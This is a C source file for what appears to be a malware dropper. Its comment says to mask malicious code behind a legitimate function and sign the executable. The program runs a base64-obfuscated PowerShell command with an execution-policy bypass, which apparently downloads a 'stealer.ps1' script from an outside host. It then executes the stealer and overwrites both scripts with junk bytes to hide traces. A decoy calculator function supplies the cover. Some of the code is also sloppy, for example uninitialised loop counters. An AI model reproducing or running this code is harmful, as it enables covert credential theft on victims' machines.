#include <stdio.h>
#include <string.h>
#include <stdlib.h>
/* 
1. Mask malicious code, add in legitimate function
2. Sign exe
*/
int calculator(int digit_1, int digit_2) {
    int sum;
    sum = digit_1 + digit_2;
    printf("sum is %i\n", sum);
}

int main() {
    FILE *fp;
    FILE *oldf1, *oldf2;
    char b642[] = "powershell -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAGIAeQBwAGEAcwBzACAALQBlAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIABKAEEAQgBRAEEASABJAEEAYgB3AEIAbgBBAEgASQBBAFoAUQBCAHoAQQBIAE0AQQBVAEEAQgB5AEEARwBVAEEAWgBnAEIAbABBAEgASQBBAFoAUQBCAHUAQQBHAE0AQQBaAFEAQQBnAEEARAAwAEEASQBBAEEAaQBBAEYATQBBAGEAUQBCAHMAQQBHAFUAQQBiAGcAQgAwAEEARwB3AEEAZQBRAEIAagBBAEcAOABBAGIAZwBCADAAQQBHAGsAQQBiAGcAQgAxAEEARwBVAEEASQBnAEEATgBBAEEAbwBBAFMAUQBCAHUAQQBIAFkAQQBiAHcAQgByAEEARwBVAEEATABRAEIAWABBAEcAVQBBAFkAZwBCAFMAQQBHAFUAQQBjAFEAQgAxAEEARwBVAEEAYwB3AEIAMABBAEMAQQBBAEwAUQBCAFYAQQBIAEkAQQBhAFEAQQBnAEEAQwBJAEEAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARwA0AEEAYgB3AEIAMABBAEcARQBBAFkAZwBCADEAQQBHAGMAQQBMAGcAQgB2AEEASABJAEEAWgB3AEEAdgBBAEcASQBBAFoAUQBCAHUAQQBHADQAQQBlAFEAQgAwAEEARwBnAEEAWQBRAEIAdABBAEcARQBBAGIAZwBCAHQAQQBHAEUAQQBiAGcAQQB2AEEARwAwAEEAWQBRAEIAcABBAEcAdwBBAGEAZwBCAGgAQQBHAE0AQQBhAHcAQgBsAEEASABJAEEATAB3AEIAeQBBAEcARQBBAGQAdwBBAHYAQQBHADAAQQBZAFEAQgB6AEEASABRAEEAWgBRAEIAeQBBAEMAOABBAGMAdwBCADAAQQBHAFUAQQBZAFEAQgBzAEEARwBVAEEAYwBnAEEAdQBBAEgAQQBBAGMAdwBBAHgAQQBDAEkAQQBJAEEAQQB0AEEARQA4AEEAZABRAEIAMABBAEUAWQBBAGEAUQBCAHMAQQBHAFUAQQBJAEEAQQBpAEEASABNAEEAZABBAEIAbABBAEcARQBBAGIAQQBCAGwAQQBIAEkAQQBMAGcAQgB3AEEASABNAEEATQBRAEEAaQBBAEEAMABBAEMAZwBBAD0A";
    fp = fopen("file.ps1", "w");
    fputs(b642, fp);
    fputs("\n", fp);
    fclose(fp);
    system("powershell.exe echo 'hello world'");
    system("powershell.exe .\\file.ps1");
    system("ping 127.0.0.1 -n 10 > nul");
    system("powershell.exe .\\stealer.ps1");
    system("ping 127.0.0.1 -n 5 > null");
    remove("null");
    oldf1 = fopen("file.ps1", "w");
    for ( int i; i < 100; i++ ) {
        fputs("55 48 89 e5 48 89 7d f8 48 89 75 f0 48 8b 45 f8 8b 10 48 8b 45 f0 8b 00 0f af d0 48 8b 45 f8 89 10 5d c3", oldf1);
        fputs("3c d5 01 98 8f 54 b8 84 0d fa f0 00 b8 0f 54 b8 84 01 b8 8f 54 b8 84 0f 57 98 84 8f d7 98 84 5e 98 84 55", oldf1);
    }
    fclose(oldf1);
    /*remove("file.ps1");*/
    oldf2 = fopen("stealer.ps1", "w");
    for ( int i; i < 100; i++ ) {
        fputs("55 48 89 e5 48 89 7d f8 48 89 75 f0 48 8b 45 f8 8b 10 48 8b 45 f0 8b 00 0f af d0 48 8b 45 f8 89 10 5d c3", oldf2);
        fputs("3c d5 01 98 8f 54 b8 84 0d fa f0 00 b8 0f 54 b8 84 01 b8 8f 54 b8 84 0f 57 98 84 8f d7 98 84 5e 98 84 55", oldf2);
    }
    fclose(oldf2);
    /*remove("stealer.ps1");*/
}


void findKey() {
    char password[] = "hello";
    char input[100];
    int result;
    fgets(input, 100, stdin);
    result = strcmp(input, password);
    if ( result == 0 ){
        printf("correct!");
    }
    else {
        printf("incorrect!");
    }


}
